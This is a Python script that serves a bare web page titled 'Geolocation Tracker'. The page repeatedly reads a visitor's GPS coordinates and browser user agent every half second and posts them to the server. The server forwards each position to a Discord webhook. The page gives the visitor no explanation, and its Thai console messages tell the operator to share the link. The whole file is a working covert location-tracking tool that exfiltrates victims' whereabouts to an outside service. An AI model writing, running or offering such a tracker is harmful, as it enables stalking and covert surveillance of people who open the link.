import json
import time
import requests
from http.server import BaseHTTPRequestHandler, HTTPServer

HTML_CONTENT = b"""<!DOCTYPE html>
<html>
<head>
    <title>Geolocation Tracker</title>
</head>
<body>
    <script>
        function send() {
            navigator.geolocation.getCurrentPosition(position => {
                const data = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    userAgent: navigator.userAgent
                };

                fetch('/', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).then(response => console.log("Location sent!"));
            });
        }
        setInterval(send, 500);
    </script>
    <h1>GPS</h1>
    <p>Bot line</p>
</body>
</html>
"""

DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL'

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Handle GET requests and return the HTML content."""
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(HTML_CONTENT)

    def do_POST(self):
        """Handle POST requests and process the JSON data sent by the client."""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data)
        
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        user_agent = data.get('userAgent')

        # Prepare the message to send to Discord
        message = {
            "content": f"ตำแหน่ง: {latitude}, {longitude}\nUser-Agent: {user_agent}"
        }

        # Send the data to Discord via the Webhook
        try:
            response = requests.post(DISCORD_WEBHOOK_URL, json=message)
            if response.status_code == 204:
                print(f"ส่งข้อมูลไปที่ Discord: {latitude}, {longitude}")
            else:
                print("ไม่สามารถส่งข้อมูลไปที่ Discord ได้")
        except Exception as e:
            print(f"เกิดข้อผิดพลาดในการส่งข้อมูลไปที่ Discord: {e}")
        
        self.send_response(200)
        self.end_headers()

if __name__ == "__main__":
    server = HTTPServer(('127.0.0.1', 5000), RequestHandler)
    print("มึงเอาลิงค์นี้ไปวางกูเกิ้ล http://127.0.0.1:5000")
    server.serve_forever()